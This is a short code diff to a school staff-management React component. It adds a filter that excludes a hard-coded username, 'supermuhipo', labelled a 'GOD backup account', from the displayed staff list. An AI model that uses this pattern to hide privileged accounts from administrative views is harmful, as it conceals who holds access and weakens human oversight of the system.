@@ -302,8 +302,8 @@ export function KepegawaianManagement() {
     }
   })
 
-  // Filter hanya staf internal resmi (Guru, Pegawai, Admin TU, Kepala Sekolah, dll, bukan siswa, wali murid, atau guru honorer/panggilan sementara)
-  const staffList = allUsers.filter(u => u.role !== 'SISWA' && u.role !== 'WALI_MURID' && u.role !== 'HONORER')
+  // Filter hanya staf internal resmi (Guru, Pegawai, Admin TU, Kepala Sekolah, dll, bukan siswa, wali murid, guru honorer sementara, atau GOD backup account)
+  const staffList = allUsers.filter(u => u.role !== 'SISWA' && u.role !== 'WALI_MURID' && u.role !== 'HONORER' && u.username !== 'supermuhipo')
 
   // Upload Handler helper dengan batas maksimal 20 MB
   const handleFileUpload = async (file: File, folder: string = 'sdm_docs'): Promise<string> => {
